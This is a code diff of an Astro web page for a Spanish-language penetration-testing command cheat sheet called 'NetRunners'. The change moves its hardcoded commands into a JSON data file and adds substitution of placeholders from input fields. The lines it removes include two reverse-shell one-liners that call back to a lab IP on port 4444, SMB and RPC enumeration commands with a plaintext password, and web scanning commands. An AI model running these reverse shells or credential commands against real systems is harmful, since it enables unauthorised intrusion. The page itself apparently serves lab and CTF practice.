@@ -3,291 +3,134 @@ import "../styles/global.css";
 import Layout from "../layouts/Layout.astro";
 import CommandBox from "../components/CommandBox.astro";
 import InputBox from "../components/InputBox.astro";
-import TabButton from "../components/TabButton.astro";
+
+import commandsData from "../data/commands.json";
+import type { CommandData } from "../types/commands";
+
+const commands: CommandData = commandsData;
+const tabs = Object.keys(commands);
 ---
 
-<html lang="en">
-	<head>
-		<meta charset="UTF-8" />
-		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-		<title>Penetration Testing Toolkit</title>
-	</head>
-	<body class="bg-gray-100 font-sans">
-		<Layout>
-			<main
-				class="h-screen bg-gray-950 text-white font-mono p-4 overflow-hidden"
+<Layout>
+	<main class="h-screen bg-gray-950 text-white font-mono p-4 overflow-hidden">
+		<div
+			class="h-full max-w-screen-lg mx-auto border-2 border-white p-4 rounded-xl flex flex-col"
+		>
+			<!-- Header -->
+			<div
+				class="flex justify-between items-center mb-4 border-b border-white pb-2"
 			>
-				<div
-					class="h-full max-w-screen-lg mx-auto border-2 border-white p-4 rounded-xl flex flex-col"
-				>
-					<div
-						class="flex justify-between items-center mb-4 border-b border-white pb-2"
-					>
-						<div class="text-xl font-bold tracking-wider">
-							NetRunners
-						</div>
-						<nav class="space-x-4">
-							<button class="text-white hover:underline"
-								>COMMANDS</button
-							>
-							<button class="text-white hover:underline"
-								>WRITEUPS</button
-							>
-							<button class="text-white hover:underline"
-								>SUPPORT</button
-							>
-							<button class="text-white hover:underline"
-								>About</button
-							>
-						</nav>
-					</div>
+				<div class="text-xl font-bold tracking-wider">NetRunners</div>
+				<nav class="space-x-4">
+					<button class="text-white hover:underline">COMMANDS</button>
+					<button class="text-white hover:underline">WRITEUPS</button>
+					<button class="text-white hover:underline">SUPPORT</button>
+					<button class="text-white hover:underline">About</button>
+				</nav>
+			</div>
 
-					<div
-						class="grid grid-cols-3 gap-4 flex-grow overflow-hidden"
-					>
-						<!-- Left Form Inputs -->
-						<div class="space-y-4">
-							<InputBox label="IP" />
-							<InputBox label="PUERTO" />
-							<InputBox label="USUARIO" />
-							<InputBox label="CONTRASEÑA" />
-							<InputBox label="DOMINIO" />
-						</div>
-
-						<!-- Command Section -->
-						<div class="col-span-2 flex flex-col overflow-hidden">
-							<div
-								class="flex space-x-2 border-b border-white pb-2 mb-2"
-							>
-								<button
-									class="tab-btn px-4 py-1 border border-white rounded-md bg-white text-black"
-									data-tab="ad">ACTIVE DIRECTORY</button
-								>
-								<button
-									class="tab-btn px-4 py-1 border border-white rounded-md text-white"
-									data-tab="web">WEB</button
-								>
-								<button
-									class="tab-btn px-4 py-1 border border-white rounded-md text-white"
-									data-tab="revshell">REVSHELL</button
-								>
-							</div>
-
-							<div
-								id="tab-content"
-								class="space-y-2 flex-grow overflow-y-auto pr-2"
-							>
-								<div data-tab-content="ad" class="space-y-2">
-									<CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/><CommandBox
-										command="smbclient -L //10.10.11.31 -U e.rodriguez"
-									/>
-									<CommandBox
-										command="rpcclient -U d.anderson -P 'WAT?watismypass!' -N 10.10.11.31"
-									/>
-								</div>
-								<div
-									data-tab-content="web"
-									class="hidden space-y-2"
-								>
-									<CommandBox
-										command="nikto -h http://10.10.11.31"
-									/>
-									<CommandBox
-										command="gobuster dir -u http://10.10.11.31 -w /usr/share/wordlists/dirb/common.txt"
-									/>
-								</div>
-								<div
-									data-tab-content="revshell"
-									class="hidden space-y-2"
-								>
-									<CommandBox
-										command="bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
-									/>
-									<CommandBox
-										command="nc -e /bin/bash 10.10.14.1 4444"
-									/>
-								</div>
-							</div>
-						</div>
-					</div>
+			<div class="grid grid-cols-3 gap-4 flex-grow overflow-hidden">
+				<!-- Left Form Inputs -->
+				<div class="space-y-4" id="input-form">
+					<InputBox label="IP" />
+					<InputBox label="PUERTO" />
+					<InputBox label="USUARIO" />
+					<InputBox label="CONTRASEÑA" />
+					<InputBox label="DOMINIO" />
 				</div>
 
-				<script>
-					const tabButtons = document.querySelectorAll(".tab-btn");
-					const tabContents =
-						document.querySelectorAll("[data-tab-content]");
-
-					tabButtons.forEach((btn) => {
-						btn.addEventListener("click", () => {
-							tabButtons.forEach((b) => {
-								b.classList.remove("bg-white", "text-black");
-								b.classList.add("text-white");
-							});
-							btn.classList.add("bg-white", "text-black");
-							btn.classList.remove("text-white");
-
-							const target = btn.getAttribute("data-tab");
-							tabContents.forEach((content) => {
-								if (
-									content.getAttribute("data-tab-content") ===
-									target
-								) {
-									content.classList.remove("hidden");
-								} else {
-									content.classList.add("hidden");
-								}
-							});
-						});
-					});
-
-					document.querySelectorAll("button").forEach((button) => {
-						if (button.textContent?.trim() === "COPY") {
-							button.addEventListener("click", () => {
-								const span =
-									button.parentElement?.querySelector("span");
-								if (!span) return;
-								const command = span.textContent;
-								if (!command) return;
-
-								navigator.clipboard
-									.writeText(command)
-									.then(() => {
-										button.textContent = "COPIED";
-										setTimeout(() => {
-											if (button)
-												button.textContent = "COPY";
-										}, 1000);
-									});
-							});
+				<!-- Command Section -->
+				<div class="col-span-2 flex flex-col overflow-hidden">
+					<div class="flex space-x-2 border-b border-white pb-2 mb-2">
+						{
+							tabs.map((tab, index) => (
+								<button
+									class={`tab-btn px-4 py-1 border border-white rounded-md ${index === 0 ? "bg-white text-black" : "text-white"}`}
+									data-tab={tab}
+								>
+									{tab.toUpperCase()}
+								</button>
+							))
 						}
+					</div>
+
+					<div
+						id="tab-content"
+						class="space-y-2 flex-grow overflow-y-auto pr-2"
+					>
+						{
+							tabs.map((tab, index) => (
+								<div
+									data-tab-content={tab}
+									class={`${index !== 0 ? "hidden" : ""} space-y-2`}
+								>
+									{Object.values(commands[tab])
+										.flat()
+										.map((cmd) => (
+											<CommandBox command={cmd} />
+										))}
+								</div>
+							))
+						}
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Script para tab-switching y sustitucion de variables -->
+		<script>
+			const tabButtons = document.querySelectorAll(".tab-btn");
+			const tabContents = document.querySelectorAll("[data-tab-content]");
+
+			// FIX: Narrow 'btn' to HTMLButtonElement to access dataset
+
+			tabButtons.forEach((btn) => {
+				btn.addEventListener("click", () => {
+					tabButtons.forEach((b) => {
+						b.classList.remove("bg-white", "text-black");
+						b.classList.add("text-white");
 					});
-				</script>
-			</main>
-		</Layout>
-	</body>
-</html>
+					btn.classList.add("bg-white", "text-black");
+					btn.classList.remove("text-white");
+
+					const target = (btn as HTMLButtonElement).dataset.tab;
+					tabContents.forEach((content) => {
+						content.classList.toggle(
+							"hidden",
+							(content as HTMLElement).dataset.tabContent !==
+								target,
+						);
+					});
+				});
+			});
+
+			const inputs = document.querySelectorAll("#input-form input");
+			const updateCommands = () => {
+				const values: Record<string, string> = {};
+				inputs.forEach((input) => {
+					const label = input.previousElementSibling?.textContent
+						?.trim()
+						.toUpperCase();
+					if (label) {
+						values[label] = (input as HTMLInputElement).value;
+					}
+				});
+				document
+					.querySelectorAll("[data-tab-content] span")
+					.forEach((span) => {
+						const el = span as HTMLSpanElement;
+						let raw = el.dataset.raw || el.textContent || "";
+						el.dataset.raw = raw;
+						Object.entries(values).forEach(([key, value]) => {
+							raw = raw.replaceAll(`{{${key}}}`, value);
+						});
+						el.textContent = raw;
+					});
+			};
+
+			inputs.forEach((input) =>
+				input.addEventListener("input", updateCommands),
+			);
+		</script>
+	</main>
+</Layout>
